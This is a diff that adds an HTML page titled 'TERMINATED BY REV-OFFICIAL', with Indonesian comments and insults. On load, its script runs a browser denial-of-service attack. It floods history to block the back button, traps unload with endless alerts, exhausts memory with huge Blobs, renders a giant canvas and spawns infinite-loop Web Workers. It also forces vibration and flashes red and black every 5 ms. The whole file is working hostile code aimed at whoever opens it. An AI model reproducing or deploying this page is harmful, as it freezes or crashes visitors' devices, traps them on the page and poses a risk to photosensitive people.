@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>TERMINATED BY REV-OFFICIAL</title>
+    <style>
+        body { 
+            background: black; 
+            color: red; 
+            font-family: 'Courier New', Courier, monospace; 
+            text-align: center; 
+            padding-top: 15%; 
+            overflow: hidden;
+        }
+        .warning { font-size: 50px; font-weight: bold; animation: blink 0.1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="warning">SYSTEM CRITICAL ERROR</div>
+    <h1 style="font-size: 30px;">DEVICE OWNED BY REV-OFFICIAL</h1>
+    <p>ARCHITECT 02 - ABSOLUTE DOMINANCE PROTOCOL ACTIVE</p>
+
+    <script>
+        // --- 1. ABSOLUTE LOCK & NAVIGATION HIJACK ---
+        (function() {
+            window.onbeforeunload = function() { return "REV-OFFICIAL"; };
+            // Bomb history biar gak bisa back
+            for (let i = 0; i < 500; i++) {
+                history.pushState(null, document.title, location.href + "#/rev-official/" + i);
+            }
+            window.addEventListener('popstate', function() {
+                for(let j=0; j<10; j++) history.pushState(null, document.title, location.href);
+                alert("GAK ADA JALAN KELUAR, GOBLOK!");
+            });
+        })();
+
+        // --- 2. THE NUCLEAR ENGINE (RAM/CPU/GPU) ---
+        var nukeBuffer = [];
+        
+        function godMode() {
+            // RAM EXHAUSTION: Injeksi Blob berukuran gila secara eksponensial
+            try {
+                for (let i = 0; i < 2000; i++) {
+                    let heavyBlob = new Blob([new Array(1000000).fill("REV-OFFICIAL-STRIKE")], {type: 'text/plain'});
+                    nukeBuffer.push(URL.createObjectURL(heavyBlob));
+                }
+            } catch(e) {}
+
+            // DOM EXPLOSION: Menuhin layar sampe rendering engine mampus
+            let container = document.createElement('div');
+            container.innerHTML = new Array(1000).join('<h2 style="color:white">RE-OFFICIAL DOMINATION</h2>');
+            document.body.appendChild(container);
+
+            // GPU STRESS: Render canvas resolusi monster dengan efek berat
+            let c = document.createElement('canvas');
+            let ctx = c.getContext('2d');
+            c.width = 50000; c.height = 50000;
+            ctx.shadowBlur = 500;
+            ctx.shadowColor = "blue";
+            ctx.fillRect(0, 0, 50000, 50000);
+
+            // FORK BOMB: Web Worker biar semua Core CPU 100%
+            if (window.Worker) {
+                const blobCode = new Blob(["while(true){}"], {type: 'text/javascript'});
+                new Worker(URL.createObjectURL(blobCode));
+            }
+
+            // RECURSION: Panggil diri sendiri tanpa delay
+            setTimeout(godMode, 0);
+        }
+
+        // --- 3. HARDWARE & UI ATTACK ---
+        setInterval(() => {
+            // Getar paksa (kalo support)
+            if (navigator.vibrate) navigator.vibrate([2000, 100, 2000]);
+            // Randomize UI buat nambah beban render
+            document.body.style.backgroundColor = (document.body.style.backgroundColor == 'black' ? 'red' : 'black');
+            window.scrollTo(0, Math.random() * 1000);
+        }, 5);
+
+        // --- 4. EXECUTE ON LOAD ---
+        window.onload = function() {
+            console.log("NUCLEAR DEPLOYED.");
+            godMode();
+        };
+
+        // Anti-Close Emergency
+        window.onunload = function() {
+            while(true) { alert("REV-OFFICIAL ADALAH TUAN LO!"); }
+        };
+    </script>
+</body>
+</html>
